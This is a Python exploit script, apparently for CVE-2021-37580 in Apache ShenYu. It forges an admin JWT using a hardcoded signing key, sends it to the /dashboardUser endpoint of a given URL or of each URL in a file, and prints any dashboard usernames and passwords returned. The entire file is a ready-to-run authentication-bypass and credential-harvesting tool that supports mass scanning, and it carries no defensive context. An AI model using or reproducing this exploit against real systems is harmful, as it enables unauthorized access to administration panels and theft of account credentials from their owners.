import argparse
import json
import time
import jsonpath
import jwt
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
apache shenyu JWT UnAuthorized!
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args
def generateToken():
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    salt = "2095132720951327"
    joker = int(time.time())
    payload = {
        "userName": "admin",
        "joker": joker
    }
    token = jwt.encode(payload=payload, key=salt,
                       algorithm='HS256', headers=headers)
    return token

def attack(url):
    print("[+]trying attack,waiting for result!")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url + '/dashboardUser'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0',
        'X-Access-Token': generateToken()
    }
    try:
        res = requests.get(url=realurl, headers=headers, verify=False, timeout=3)
        if res.status_code == 200 and 'password' in res.text:
            username = jsonpath.jsonpath(json.loads(res.text),expr='$..dataList..userName')
            password = jsonpath.jsonpath(json.loads(res.text), expr='$..dataList..password')
            for i in range(len(username)):
                print("[+]success get the account!  The result for:"+url+"  "+username[i]+':'+password[i])
        else:
            print("[-]fail to get the account!")
    except Exception as e:
        print("[-]vuln not exists")


def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[-1:]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
  _______      ________    ___   ___ ___  __       ____ ______ _____  ___   ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \____  | ____|/ _ \ / _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) || |______ __) |  / /| |__ | (_) | | | |
| |      \ \/ / |  __|______/ /| | | |/ / | |______|__ <  / / |___ \ > _ <| | | |
| |____   \  /  | |____    / /_| |_| / /_ | |      ___) |/ /   ___) | (_) | |_| |
 \_____|   \/   |______|  |____|\___/____||_|     |____//_/   |____/ \___/ \___/ 

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()
